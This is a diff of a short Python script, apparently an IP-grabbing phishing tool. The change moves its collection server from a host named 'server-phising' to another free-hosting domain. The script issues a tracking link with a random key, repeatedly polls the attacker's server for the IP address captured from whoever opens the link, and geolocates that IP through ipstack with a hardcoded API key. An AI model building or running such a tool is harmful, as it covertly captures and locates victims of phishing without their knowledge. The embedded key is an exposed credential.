@@ -1,9 +1,9 @@
-import requests, random, json, sys, time, os
+import requests, random, sys, time, os
 
 
 api_key = '2388107e74e7fe5424554967771b568b';
 rand = random.randint(000, 999)
-url = 'https://server-phising.000webhostapp.com/ip.php?rand='+str(rand)
+url = 'http://weebs.epizy.com/me.php?key='+str(rand)
 
 banner = '''
  __ _____
@@ -29,7 +29,7 @@ a = raw_input('Tab for continue...')
 p = 1
 while p <= 9999:
  	p += 1
- 	ip = requests.get('https://server-phising.000webhostapp.com/ip_'+str(rand)+'.txt')
+ 	ip = requests.get('http://weebs.epizy.com/return/'+str(rand)+'_return.txt')
  	if ip.status_code == 200:
  		urls = 'http://api.ipstack.com/'+str(ip.text)+'?access_key='+str(api_key);
  		result = requests.get(urls);
